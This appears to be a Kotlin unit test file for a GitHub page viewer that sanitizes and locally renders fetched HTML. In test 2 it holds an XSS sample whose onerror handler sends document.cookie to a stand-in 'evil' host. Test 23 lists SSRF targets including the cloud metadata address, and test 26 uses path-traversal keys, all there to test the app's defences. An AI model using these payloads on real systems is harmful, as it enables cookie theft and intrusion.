package com.gh.dl.data

import com.gh.dl.ui.AppState
import org.junit.After
import org.junit.Assert.assertEquals
import org.junit.Assert.assertArrayEquals
import org.junit.Before
import org.junit.Assert.assertFalse
import org.junit.Assert.assertNotEquals
import org.junit.Assert.assertTrue
import org.junit.Test

/**
 * GhView「抓取后的本地渲染」的纯逻辑单测（不联网、不碰 WebView）。
 *
 * 样本全部照抄实测到的真实结构（githubfast.com 与 github.com 两边一致）：
 *  - README 正文在 `<article class="markdown-body">` 里，是服务端渲染好的；
 *  - 镜像把链接写成 `https://githubfast.com/...`、图片写成 `https://usercontent.githubfast.com/avatars/u/…`；
 *  - 源码页逐行内容在 `<script data-target="react-app.embeddedData">` 的 rawLines 里；
 *  - 目录页条目在 `td .react-directory-truncate a`。
 * 之所以值得测：这些地方一旦选错（比如净化漏了 script、镜像地址没折回官方），
 * 表现就是「页面空白 / 点了没反应 / 界面里冒出镜像域名」，在真机上很难查。
 */
class GhViewTest {

    /** 换掉前先存着真实实现，见 [online] */
    private val defaultLoader = GhView.imageLoader

    /** 单测不联网：让所有取图直接失败，顺便验证「失败的图会被删掉而不是留下外链」 */
    @Before
    fun offline() {
        GhView.imageLoader = { null }
    }

    /**
     * 必须还原：imageLoader 在 object 上，是 JVM 级全局。
     * 不还原的话，同一批单测里别的用例（比如要真连网跑样本的那个）会莫名其妙取不到图。
     */
    @After
    fun online() {
        GhView.imageLoader = defaultLoader
    }

    private fun repoPage(bodyHtml: String, extraHead: String = "") = """
        <html><head><title>GitHub - microsoft/vscode · GitHub</title>
        $extraHead
        <meta name="description" content="Visual Studio Code.">
        </head><body>
        <header class="Header">登录提示</header>
        <main>
          <div class="Layout-content">
            <article class="markdown-body">$bodyHtml</article>
          </div>
        </main>
        <script type="application/json">{"stargazerCount":193493,"forksCount":44771}</script>
        </body></html>
    """.trimIndent()

    /** 1. README：正文保留、标题清洗、镜像链接折算回 github.com */
    @Test
    fun readmeRendersWithLogicalLinks() {
        val raw = repoPage(
            """<h1>Awesome Python</h1>
               <p>See <a href="https://githubfast.com/vinta/awesome-python/blob/master/SPONSORSHIP.md">sponsorship</a>
               and <a href="/vinta/awesome-python/tree/master/docs">docs</a>
               and <a href="blob/master/README.md">self</a>
               and <a href="https://awesome-python.com/">external site</a>.</p>"""
        )
        val p = GhView.render("https://github.com/vinta/awesome-python", raw, "经镜像加速")
        val html = p.html

        assertTrue("标题应去掉 GitHub 前后缀", p.title == "Awesome Python" || html.contains("Awesome Python"))
        assertTrue("README 正文要在", html.contains("Awesome Python"))
        assertTrue("正文要点开的相对链接要补成仓库根地址",
            html.contains("https://github.com/vinta/awesome-python/blob/master/SPONSORSHIP.md"))
        assertTrue("站内绝对链接折算回官方",
            html.contains("https://github.com/vinta/awesome-python/tree/master/docs"))
        assertTrue("README 里裸写的相对路径按仓库根解析",
            html.contains("https://github.com/vinta/awesome-python/blob/master/README.md"))
        assertTrue("外站链接保持原样", html.contains("https://awesome-python.com/"))
        assertFalse("界面里不能出现镜像域名", html.contains("githubfast.com"))
        assertFalse("页头导航不该带进来", html.contains("登录提示"))
    }

    /** 2. 不可信内容必须净化：脚本、事件属性、javascript: 链接都进不了最终页面 */
    @Test
    fun hostileReadmeIsSanitized() {
        val raw = repoPage(
            """<p>正常文字</p>
               <script>alert(1)</script>
               <img src="https://github.com/a/b/x.png" onerror="fetch('https://evil/?c='+document.cookie)">
               <a href="javascript:alert(2)">点我</a>
               <iframe src="https://evil.example/"></iframe>"""
        )
        val html = GhView.render("https://github.com/a/b", raw, "直连 GitHub").html
        assertFalse("script 标签必须被去掉", html.contains("<script"))
        assertFalse("on* 事件属性必须被去掉", html.contains("onerror"))
        assertFalse("javascript: 链接必须被去掉", html.contains("javascript:"))
        assertFalse("iframe 必须被去掉", html.contains("<iframe"))
        // 抓取阶段样本里没有可取的图（图片一律由我们自己取，取不到就删），所以不许留外链
        assertFalse("取不到的图不应留下会联网的地址", html.contains("evil.example"))
        assertTrue("正文该留着", html.contains("正常文字"))
    }

    /** 3. 无 README 的仓库页取整块 main，但脚本/提示条仍被清掉 */
    @Test
    fun fallsBackToMainWithoutReadme() {
        val raw = """
            <html><head><title>Files · main · octocat/Hello-World · GitHub</title></head>
            <body><main>
              <div class="Box">
                <div class="flash">这个仓库还没提交 README</div>
                <p class="notice-text">仓库概览文字</p>
                <script>track()</script>
              </div>
            </main></body></html>
        """.trimIndent()
        val html = GhView.render("https://github.com/octocat/Hello-World", raw, "直连 GitHub").html
        assertTrue("兜底要保留正文", html.contains("仓库概览文字"))
        assertFalse("提示条不该占屏", html.contains("这个仓库还没提交 README"))
        assertFalse("脚本必须清掉", html.contains("<script"))
    }

    /** 4. 目录页：条目名 + 链接排成列表，目录带斜杠 */
    @Test
    fun directoryPageBecomesList() {
        val raw = """
            <html><head><title>vscode/.github at main</title></head><body><main>
              <table><tbody>
                <tr><td><div class="react-directory-truncate">
                  <a href="/microsoft/vscode/tree/main/.github/ISSUE_TEMPLATE" aria-label="app, (Directory)">app</a>
                </div></td></tr>
                <tr><td><div class="react-directory-truncate">
                  <a href="/microsoft/vscode/blob/main/.github/CODEOWNERS" aria-label="CODEOWNERS, (File)">CODEOWNERS</a>
                </div></td></tr>
              </tbody></table>
            </main></body></html>
        """.trimIndent()
        val html = GhView.render("https://github.com/microsoft/vscode/tree/main/.github", raw, "经镜像加速").html
        assertTrue("目录项应在", html.contains("app/"))
        assertTrue("文件项应在", html.contains("CODEOWNERS"))
        assertTrue("目录链接保留完整路径",
            html.contains("https://github.com/microsoft/vscode/tree/main/.github/ISSUE_TEMPLATE"))
        assertTrue("列表样式类应出现", html.contains("dirlist"))
    }

    /** 5. 源码页：从同页 JSON 的 rawLines 取逐行内容（实测结构） */
    @Test
    fun codePageUsesRawLines() {
        val json = """{"payload":{"codeViewBlobLayoutRoute.StyledBlob":{"rawLines":["MIT License","","Copyright (c) 2015 - present Microsoft Corporation"]}}}"""
        val raw = """
            <html><head><title>LICENSE.txt at main · microsoft/vscode · GitHub</title></head>
            <body><main><div class="Box"><pre>占位</pre></div></main>
            <script type="application/json" data-target="react-app.embeddedData">$json</script>
            </body></html>
        """.trimIndent()
        val html = GhView.render("https://github.com/microsoft/vscode/blob/main/LICENSE.txt", raw, "直连 GitHub").html
        assertTrue("逐行正文要取出来", html.contains("MIT License"))
        assertTrue("空行也要保留", html.contains("Copyright (c) 2015 - present Microsoft Corporation"))
        assertTrue("应包成代码块", html.contains("pre class=\"code\""))
        assertFalse("HTML 里那个占位 pre 不该被用掉", html.contains("占位"))
    }

    /** 6. stars / forks / 描述等元信息从实测位置提取 */
    @Test
    fun extractsRepoMeta() {
        val raw = repoPage(
            "<p>x</p>",
            """<meta property="og:description" content="Visual Studio Code. Contribute to microsoft/vscode development.">"""
        )
        val html = GhView.render("https://github.com/microsoft/vscode", raw, "经镜像加速").html
        assertTrue("星数要显示", html.contains("193493"))
        assertTrue("叉数要显示", html.contains("44771"))
        assertTrue("描述要显示", html.contains("Visual Studio Code"))
        assertTrue("标签里应写明来源通道", html.contains("经镜像加速"))
        // 实测：镜像与官方都没有 primaryLanguage / datetime 字段，取不到就不显示，绝不编造
    }

    /** 7. 镜像资产域 → 官方地址（逐条都是实测换算结果） */
    @Test
    fun mirrorUrlsMapBackToOfficial() {
        assertEquals("https://github.com/vinta/awesome-python",
            GhView.toLogical("https://githubfast.com/vinta/awesome-python"))
        assertEquals("https://github.com/a/b?x=1",
            GhView.toLogical("https://githubfast.com/a/b?x=1"))
        // usercontent 把原域名首段写进了路径，折回时要把那一段去掉
        assertEquals("https://avatars.githubusercontent.com/u/6154722?s=60&v=4",
            GhView.toLogical("https://usercontent.githubfast.com/avatars/u/6154722?s=60&v=4"))
        assertEquals("https://camo.githubusercontent.com/e033a5/687474",
            GhView.toLogical("https://usercontent.githubfast.com/camo/e033a5/687474"))
        assertEquals("https://github.githubassets.com/assets/foo-1.js",
            GhView.toLogical("https://assets.githubfast.com/assets/foo-1.js"))
        assertEquals("https://github.githubassets.com/images/foo.png",
            GhView.toLogical("https://usercontent.githubfast.com/assets/images/foo.png"))
        // 镜像的通用外站通道
        assertEquals("https://img.shields.io/badge/a-b-green",
            GhView.toLogical("https://external.githubfast.com/https/img.shields.io/badge/a-b-green"))
        // 非镜像地址原样返回
        assertEquals("https://github.com/a/b", GhView.toLogical("https://github.com/a/b"))
        assertEquals("https://example.com/x", GhView.toLogical("https://example.com/x"))
    }

    /** 8. 反向：官方地址 → 镜像通道（取图备用），认不出的返回 null */
    @Test
    fun mirrorFallbackPaths() {
        assertEquals("https://githubfast.com/a/b", GhView.mirrorOf("https://github.com/a/b"))
        assertEquals("https://githubfast.com/a/b/raw/main/x.png",
            GhView.mirrorOf("https://raw.githubusercontent.com/a/b/main/x.png"))
        assertEquals("https://usercontent.githubfast.com/avatars/u/905434?s=60",
            GhView.mirrorOf("https://avatars.githubusercontent.com/u/905434?s=60"))
        assertEquals("https://assets.githubfast.com/assets/foo.js",
            GhView.mirrorOf("https://github.githubassets.com/assets/foo.js"))
        // 外站与第三方托管没有「githubfast 对应关系」，不能硬凑
        assertTrue(GhView.mirrorOf("https://img.shields.io/badge?x=1") == null)
        assertTrue(GhView.mirrorOf("https://gitee.com/a/b") == null)
    }

    /** 9. 相对链接基准：README 里的写法要相对仓库根，而不是当前 tree 目录 */
    @Test
    fun resolvesAgainstRepoRoot() {
        assertEquals("https://github.com/a/b", GhView.repoRoot("https://github.com/a/b"))
        // 带 tree/分支/目录 的页面也要折到仓库根：README 里的相对写法本来就相对仓库根
        assertEquals("https://github.com/a/b", GhView.repoRoot("https://github.com/a/b/tree/main/docs"))
        // 文件页也一样折到仓库根，README 里 "blob/main/x.py" 才指得对
        assertEquals("https://github.com/a/b", GhView.repoRoot("https://github.com/a/b/blob/main/x.py"))
        assertEquals("https://github.com/a", GhView.repoRoot("https://github.com/a"))
        assertEquals("https://github.com", GhView.repoRoot("https://github.com/"))

        assertEquals("https://github.com/a/b/blob/main/x.py",
            GhView.resolveRef("blob/main/x.py", "https://github.com/a/b"))
        assertEquals("https://github.com/login?return_to=x",
            GhView.resolveRef("/login?return_to=x", "https://githubfast.com/a/b"))
        assertEquals("https://github.com/a/b/docs/x.png",
            GhView.resolveRef("./docs/x.png", "https://github.com/a/b"))
        assertEquals("mailto:a@b.c", GhView.resolveRef("mailto:a@b.c", "https://github.com/a/b"))
    }

    /** 10. 净化器本身：白名单外的东西一律不留 */
    @Test
    fun sanitizerDropsDangerousStuff() {
        val out = Sanitize.html(
            "<p onclick=\"x()\">hi</p><script>alert(1)</script>" +
                "<a href=\"javascript:alert(2)\">l</a><div>ok<b>b</b>" +
                "<img src=\"https://github.com/a/b.png\"></div>"
        )
        assertFalse(out.contains("onclick"))
        assertFalse(out.contains("<script"))
        assertFalse(out.contains("javascript:"))
        assertTrue(out.contains("hi"))
        assertTrue(out.contains("<b>b</b>"))
        assertTrue("图片地址要原样留着（由取图阶段处理）", out.contains("https://github.com/a/b.png"))
    }

    /**
     * 11. 超长正文按**元素**边界截断，绝不切进 base64 图片中间。
     * 真机截图里那张「破图 + 正文过长已截断」就是这么来的：
     * 旧实现先内联图片再对整段字符串 substring，正好切在 data: URI 里。
     */
    @Test
    fun truncationNeverSplitsAnInlinedImage() {
        val big = "A".repeat(4000)
        val uri = "data:image/png;base64,$big"
        val body = org.jsoup.nodes.Element("div")
        // README 实际就是这种形状：正文整块在一个子元素里，图片散在它内部
        body.append(
            "<article>" +
                "<p><img src=\"$uri\"></p>" +
                "<p><img src=\"$uri\"></p>" +
                "<p>tail</p>" +
                "</article>"
        )
        val cut = GhView.truncateToBudget(body, 5000, 0)
        val html = body.html()
        assertTrue("超预算必须判定为截断过", cut)
        // 保住的那张图必须是完整 URI（要么整条在，要么整条没，绝不能半截）
        assertTrue("保留下来的图必须是完整的", html.contains("$uri\""))
        val complete = Regex("base64," + big + "\"").findAll(html).count()
        assertEquals("每一条 data: 都必须完整闭合", complete, Regex("data:image/png").findAll(html).count())
        assertTrue("装不下的尾部要丢掉", !html.contains("tail"))
    }

    /** 12. 预算内的页面不动它，也不加提示 */
    @Test
    fun shortBodyIsLeftAlone() {
        val body = org.jsoup.nodes.Element("div")
        body.append("<p>hello</p>")
        assertFalse(GhView.truncateToBudget(body, 10_000, 0))
        assertEquals("<p>hello</p>", body.html())
    }

    /** 13. 两档加速互相独立：下载开关不影响浏览抓取地址，反之亦然（第五轮拆分的核心） */
    @Test
    fun downloadAndBrowseAccelAreIndependent() {
        val dl = AppState.accelOn
        val br = AppState.browseAccelOn
        val mirrors = GhView.pageMirrors
        try {
            GhView.applyMirrors(listOf("https://mirror.example"))
            AppState.accelOn = true
            AppState.browseAccelOn = false
            // 只开下载加速：浏览仍然只直连，绝不把文件前缀拼到网页上
            assertEquals(listOf("https://github.com/a/b"), GhView.candidates("https://github.com/a/b"))
            AppState.accelOn = false
            AppState.browseAccelOn = true
            val both = GhView.candidates("https://github.com/a/b")
            assertEquals(2, both.size)
            assertEquals("https://mirror.example/a/b", both[0])
            assertEquals("https://github.com/a/b", both[1])
            // 非 GitHub 地址一律不改写
            assertEquals(listOf("https://gitee.com/a/b"), GhView.candidates("https://gitee.com/a/b"))
        } finally {
            AppState.accelOn = dl
            AppState.browseAccelOn = br
            GhView.pageMirrors = mirrors
        }
    }

    /** 14. 用户自定义镜像站以后，地址折算要跟着换后缀（不能还按 githubfast 硬编码） */
    @Test
    fun mirrorMappingFollowsConfiguredList() {
        val mirrors = GhView.pageMirrors
        try {
            // 空列表 = 没自定义，回落内置那一个
            GhView.applyMirrors(emptyList())
            assertEquals("https://githubfast.com/a/b", GhView.mirrorOf("https://github.com/a/b"))
            assertEquals("https://github.com/a/b", GhView.toLogical("https://githubfast.com/a/b"))

            GhView.applyMirrors(listOf("https://my.mirror.example/"))
            assertEquals("https://my.mirror.example/a/b", GhView.mirrorOf("https://github.com/a/b"))
            assertEquals("https://github.com/a/b", GhView.toLogical("https://my.mirror.example/a/b"))
            assertEquals(
                "https://avatars.githubusercontent.com/u/1",
                GhView.toLogical("https://usercontent.my.mirror.example/avatars/u/1")
            )
            // 换站之后，旧站地址不再被当成镜像（不认错）
            assertEquals("https://githubfast.com/a/b", GhView.toLogical("https://githubfast.com/a/b"))
        } finally {
            GhView.pageMirrors = mirrors
        }
    }

    /** 15. 镜像站列表输入解析：去尾斜杠、去空行、去重、非 http(s) 一律不要 */
    @Test
    fun mirrorInputIsCleaned() {
        assertEquals(
            listOf("https://a.example", "http://b.example/x"),
            GhView.parseMirrors(
                "  https://a.example/  \n\nhttps://a.example/\n" +
                    "b.example\nhttp://b.example/x/\n# comment"
            )
        )
    }

    // ---- 第六轮：图片策略 / 解析引擎 ----

    /** 存一下这一轮要改的三个全局，逐条用例自己还原 */
    private fun withImageMode(mode: String, block: () -> Unit) {
        val old = AppState.imageMode
        try { AppState.imageMode = mode; block() } finally { AppState.imageMode = old }
    }

    private fun <T> withEngine(engine: String, block: () -> T): T {
        val old = AppState.parseEngine
        // 以前这里忘了赋值，于是 22 号用例其实一直在跑默认引擎也能过——
        // 「测了等于没测」比不测更糟，补上赋值，并顺手断言真的切进去了
        AppState.parseEngine = engine
        try {
            if (engine != GhView.ENGINE_JSOUP) assertEquals(engine, AppState.parseEngine)
            return block()
        } finally {
            AppState.parseEngine = old
        }
    }

    /**
     * 16. 默认（本地缓存）模式：图片换成虚拟地址，**页面里不留原始图片 URL**，
     * 也不再产生 base64 —— 这正是「内容过长」那条提示的根因所在。
     */
    @Test
    fun localImageModeKeepsBodySmallAndLeavesNoExternalUrl() {
        val raw = repoPage("<p>正文</p><img src=\"https://github.com/a/b/shot.png\">")
        withImageMode(GhView.IMAGE_LOCAL) {
            val html = GhView.render("https://github.com/a/b", raw, "经镜像加速").html
            assertTrue("要变成虚拟地址", html.contains("https://" + GhView.IMG_HOST + "/"))
            assertFalse("不能再留会联网的图片地址", html.contains("shot.png"))
            assertFalse("不该有 base64 内联", html.contains("data:image"))
            assertFalse("正文不该被截断", html.contains("内容过长"))
        }
    }

    /** 17. 虚拟地址要能反查回真实候选，否则界面取不到图（等于全部破图） */
    @Test
    fun localImageKeyResolvesBackToCandidates() {
        val raw = repoPage("<img src=\"https://github.com/a/b/shot.png\">")
        withImageMode(GhView.IMAGE_LOCAL) {
            val html = GhView.render("https://github.com/a/b", raw, "经镜像加速").html
            val key = Regex("https://" + GhView.IMG_HOST + "/([0-9a-f]+)").find(html)!!.groupValues[1]
            val cands = GhView.candidatesFor(key)
            assertTrue("候选里必须有官方地址", cands.contains("https://github.com/a/b/shot.png"))
            assertTrue("候选里必须有镜像地址", cands.any { it.contains("githubfast.com") })
        }
    }

    /** 18. 「不显示图片」：一个 <img> 都不留 */
    @Test
    fun imageOffDropsEveryImg() {
        val raw = repoPage("<p>x</p><img src=\"https://github.com/a/b/1.png\"><img src=\"https://github.com/a/b/2.png\">")
        withImageMode(GhView.IMAGE_OFF) {
            val html = GhView.render("https://github.com/a/b", raw, "直连 GitHub").html
            assertEquals(0, Regex("<img").findAll(html).count())
            assertTrue("正文仍要在", html.contains(">x<"))
        }
    }

    /** 19. 「内联」档保留旧行为：取到才转 data:，取不到仍然删掉（不留外链） */
    @Test
    fun base64ModeStillDropsUnfetchableImages() {
        val raw = repoPage("<img src=\"https://github.com/a/b/1.png\">")
        val old = GhView.imageLoader
        try {
            withImageMode(GhView.IMAGE_BASE64) {
                GhView.imageLoader = { null }
                val miss = GhView.render("https://github.com/a/b", raw, "直连 GitHub").html
                assertEquals("取不到必须删掉", 0, Regex("<img").findAll(miss).count())

                GhView.imageLoader = { byteArrayOf(0x89.toByte(), 'P'.code.toByte()) to "image/png" }
                val hit = GhView.render("https://github.com/a/b", raw, "直连 GitHub").html
                assertTrue("取到了才内联", hit.contains("data:image/png;base64,"))
            }
        } finally {
            GhView.imageLoader = old
        }
    }

    /** 20. 四档引擎都要能解析正常页与畸形页，且都能拿到正文（失败的内部会回落默认档） */
    @Test
    fun everyEngineHandlesNormalAndMalformed() {
        val normal = repoPage("<h1>T</h1><p>body</p>")
        // 故意畸形：不闭合 article、未转义的 < 、多余的闭合标签
        val malformed = normal.replace("</article>", "")
            .replace("<p>body</p>", "<p>body a < b & c</p></div></span>")
        for ((id, _) in GhView.ENGINES) {
            for ((tag, src) in listOf("正常" to normal, "畸形" to malformed)) {
                val doc = GhView.parseDoc(src, "https://github.com/a/b", id)
                val art = doc.selectFirst("article.markdown-body")
                // 注意 ${tag} 要带花括号：中文字符是合法标识符字符，"$tag页" 会被当成 tag页
                assertTrue("$id 引擎在${tag}页取不到正文", art != null)
                assertTrue("$id 引擎在${tag}页正文丢了", art!!.text().contains("body"))
            }
        }
    }

    /** 21. 「只解析正文」档：能定位就切，定位不了必须返回 null（切错比不切更糟） */
    @Test
    fun articleSliceOnlyCutsWhenPairingIsClear() {
        val raw = repoPage("<p>正文在这里</p>")
        val cut = GhView.articleSlice(raw)
        assertTrue("要切到正文", cut != null && cut.contains("正文在这里"))
        assertTrue("切出来必须是自包含的 article",
            cut!!.startsWith("<article") && cut.endsWith("</article>"))
        assertTrue("不该把整页脚本 JSON 带进来", !cut.contains("stargazerCount"))
        assertTrue("没有正文的页面要返回 null", GhView.articleSlice("<html><body><main>x</main></body></html>") == null)
    }

    /** 22. 切片档整条链路要仍然可用：正文、元信息、链接折算都不能少 */
    @Test
    fun fastEngineStillRendersFullPage() {
        val raw = repoPage("<p>See <a href=\"/a/b/tree/main/docs\">docs</a></p>")
        withEngine(GhView.ENGINE_FAST) {
            val html = GhView.render("https://github.com/a/b", raw, "经镜像加速").html
            assertTrue("正文在", html.contains("docs"))
            assertTrue("链接要折算成官方地址", html.contains("https://github.com/a/b/tree/main/docs"))
            assertTrue("星数（只能走正则）也要在", html.contains("193493"))
            assertTrue("标题不能因为切片而丢", html.contains("vscode"))
        }
    }

    /** 23. SSRF：非点分写法的内网地址也必须拦住（这是 curl/wget 唯一的护栏） */
    @Test
    fun ssrfGuardCoversAlternateIpLiteralForms() {
        val blocked = listOf(
            "https://127.0.0.1/x.png",
            "https://10.1.2.3/x.png",
            "https://192.168.1.1/x.png",
            "https://172.16.0.1/x.png",
            "https://169.254.169.254/latest/meta-data",  // 云元数据
            "https://localhost/x.png",
            "https://anything.local/x.png",
            "https://2130706433/x.png",     // = 127.0.0.1 十进制写法
            "https://0x7f000001/x.png",     // = 127.0.0.1 十六进制写法
            "https://[::1]/x.png",          // IPv6 回环
            "https://[fd00::1]/x.png",      // IPv6 ULA
            "https://[fe80::1]/x.png",      // IPv6 链路本地
            "https://[::ffff:127.0.0.1]/x.png" // IPv4 映射
        )
        for (u in blocked) assertFalse("$u 应该拦掉", GhView.isPublicHost(u))
        val allowed = listOf(
            "https://github.com/a/b/1.png",
            "https://raw.githubusercontent.com/a/b/1.png",
            "https://img.shields.io/badge/x.svg",
            "https://8.8.8.8/x.png"          // 公网 IP 字面量不该被误杀
        )
        for (u in allowed) assertTrue("$u 不该被拦", GhView.isPublicHost(u))
    }

    /** 24. 图片缓存：写进去要能读回来，且读回来的是**真正的 MIME**（以前给的是扩展名） */
    @Test
    fun imageCacheRoundTripsWithRealMime() {
        val dir = java.nio.file.Files.createTempDirectory("ghimg-test").toFile()
        val old = GhView.imageCacheDir
        val png = byteArrayOf(0x89.toByte(), 'P'.code.toByte(), 'N'.code.toByte(), 'G'.code.toByte(),
            0x0D, 0x0A, 0x1A, 0x0A, 1, 2, 3)
        try {
            GhView.imageCacheDir = dir
            val key = "0123456789abcdef"
            val loader = GhView.imageLoader
            val cands = listOf("https://github.com/a/b/shot.png")
            GhView.rememberCandidatesForTest(key, cands)
            GhView.imageLoader = { png to "image/png" }
            try {
                val first = GhView.loadImage(key)
                assertTrue("第一次要真的去取到", first != null)
                assertEquals("image/png", first!!.second)
                val second = GhView.loadImage(key)
                assertTrue("第二次要命中缓存", second != null)
                assertArrayEquals(png, second!!.first)
            } finally {
                GhView.imageLoader = loader
            }
        } finally {
            GhView.imageCacheDir = old
            dir.deleteRecursively()
        }
    }

    /** 25. 缓存里的坏文件（截断 / 内容对不上格式）必须被识破并删掉，不能喂给 WebView */
    @Test
    fun corruptCacheFileIsRejectedAndDeleted() {
        val dir = java.nio.file.Files.createTempDirectory("ghimg-bad").toFile()
        val old = GhView.imageCacheDir
        try {
            GhView.imageCacheDir = dir
            dir.mkdirs()
            // 名字写着 png，内容却是半截 HTML —— 以前这会被直接当图片发回 WebView
            val bogus = java.io.File(dir, "0123456789abcdef.png")
            bogus.writeText("<html><body>not an image at all")
            val key = "0123456789abcdef"
            val loader = GhView.imageLoader
            GhView.rememberCandidatesForTest(key, listOf("https://github.com/a/b/shot.png"))
            GhView.imageLoader = { null }   // 取图也失败：证明「没有拿坏文件当结果」
            try {
                assertTrue("坏缓存不能被当成图片返回", GhView.loadImage(key) == null)
                assertTrue("坏文件要被删掉", !bogus.exists())
            } finally {
                GhView.imageLoader = loader
            }
        } finally {
            GhView.imageCacheDir = old
            dir.deleteRecursively()
        }
    }

    /** 26. key 必须是纯十六进制短串：带 / 或 .. 的一律拒绝，别让人写穿缓存目录 */
    @Test
    fun imageCacheKeyIsValidated() {
        val dir = java.nio.file.Files.createTempDirectory("ghimg-key").toFile()
        val old = GhView.imageCacheDir
        try {
            GhView.imageCacheDir = dir
            for (evil in listOf("../../files/x", "abc/../..", "", "ZzZzZzZz", "0123456789abcdefgh")) {
                GhView.rememberCandidatesForTest(evil, listOf("https://github.com/a/b/1.png"))
                val loader = GhView.imageLoader
                GhView.imageLoader = { byteArrayOf(0x89.toByte(), 'P'.code.toByte()) to "image/png" }
                try {
                    GhView.loadImage(evil)
                } finally {
                    GhView.imageLoader = loader
                }
                assertEquals("非法 key 不该在缓存目录里留下任何文件：$evil", 0, dir.listFiles()?.size ?: -1)
            }
        } finally {
            GhView.imageCacheDir = old
            dir.deleteRecursively()
        }
    }

    /** 27. 命中页面缓存时必须一次网络都不发（换引擎/换图片方式的真实路径） */
    @Test
    fun engineChangeReusesCachedRawHtmlWithoutAnyNetwork() {
        val raw = repoPage("<p>正文</p><img src=\"https://github.com/a/b/shot.png\">")
        val u = "https://github.com/a/b"
        val oldAccel = AppState.browseAccelOn
        val oldFetcher = AppState.fetcher
        val oldMode = AppState.imageMode
        val oldEngine = AppState.parseEngine
        try {
            // 保证「万一走了联网这条路」必败：加速关掉、取图全失败，
            // 这样只有命中缓存才可能成功，测出来的才是真话
            AppState.browseAccelOn = false
            AppState.fetcher = Fetcher.OKHTTP
            GhView.imageLoader = { null }
            GhView.clearRawCache()
            GhView.primeRawCacheForTest(u, raw, false)
            val a = GhView.fetch(u)
            assertTrue("默认档要出正文", a.html.contains("正文"))
            assertTrue("命中缓存要在页脚说清楚（用户看得见的凭证）", a.note.contains("复用页面缓存"))
            val b = withEngine(GhView.ENGINE_FAST) { GhView.fetch(u) }
            assertTrue("切片档也要复用同一条缓存", b.note.contains("复用页面缓存"))
            assertTrue("切片档正文要在", b.html.contains("正文"))
            assertTrue("切片档图片仍用虚拟地址", b.html.contains("https://" + GhView.IMG_HOST + "/"))
            assertFalse("界面里不能出现镜像域名", b.html.contains("githubfast.com"))
        } finally {
            AppState.browseAccelOn = oldAccel
            AppState.fetcher = oldFetcher
            AppState.imageMode = oldMode
            AppState.parseEngine = oldEngine
            GhView.clearRawCache()
        }
    }

    /** 28. 缓存键只含「会改变取哪份网络内容」的项，换引擎/换图片方式必须命中同一条 */
    @Test
    fun rawCacheKeyFollowsNetOptionsOnly() {
        val oldAccel = AppState.browseAccelOn
        val oldFetcher = AppState.fetcher
        val oldEngine = AppState.parseEngine
        val oldMode = AppState.imageMode
        try {
            val u = "https://github.com/a/b"
            val k1 = GhView.rawCacheKey(u)
            AppState.parseEngine = GhView.ENGINE_XML
            AppState.imageMode = GhView.IMAGE_BASE64
            assertEquals("换引擎/换图片方式必须命中同一条缓存（否则就是重复联网）", k1, GhView.rawCacheKey(u))
            AppState.browseAccelOn = !oldAccel
            assertNotEquals("换加速开关必须换键（取的网络内容不同）", k1, GhView.rawCacheKey(u))
            AppState.browseAccelOn = oldAccel
            AppState.fetcher = Fetcher.CURL
            assertNotEquals("换抓取器必须换键", k1, GhView.rawCacheKey(u))
        } finally {
            AppState.browseAccelOn = oldAccel
            AppState.fetcher = oldFetcher
            AppState.parseEngine = oldEngine
            AppState.imageMode = oldMode
        }
    }
}
